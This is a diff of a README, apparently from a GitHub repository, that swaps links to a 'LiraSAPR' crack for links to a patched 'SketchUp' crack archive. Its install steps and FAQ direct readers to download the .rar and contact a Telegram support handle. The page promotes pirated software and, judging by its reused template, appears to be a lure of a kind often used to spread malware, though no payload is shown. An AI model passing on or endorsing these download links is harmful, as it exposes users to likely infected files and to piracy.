@@ -9,7 +9,7 @@ SketchUp is a powerful 3D modeling tool used for a wide range of drawing applica
 - Disk Space: Minimum 2 GB 💾
 
 ## Installation 🛠
-1. Download the latest release [here](https://github.com/gagaga1132/LiraSAPR/releases/download/LiraSAPR_Crack/LiraSAPR_crack_Full_Patched_x64.rar). 📥
+1. Download the latest release [here](https://github.com/gagaga1132/SketchUp/releases/download/SketchUp_Crack/SketchUp_crack_Full_Patched_x64.rar). 📥
 2. Extract the archive and follow the installation instructions. 📂
 3. After installation, launch the application. 🚀
 
@@ -25,7 +25,7 @@ here
 
 # Frequently Asked Questions (FAQ) ❓
 - How do I install the program? 🤔
-- You can install from new [release](https://github.com/gagaga1132/LiraSAPR/releases/download/LiraSAPR_Crack/LiraSAPR_crack_Full_Patched_x64.rar)
+- You can install from new [release](https://github.com/gagaga1132/SketchUp/releases/download/SketchUp_Crack/SketchUp_crack_Full_Patched_x64.rar)
 
 - How can I get support? 💬
 - Out TG Support [Support](@MBNSupport)
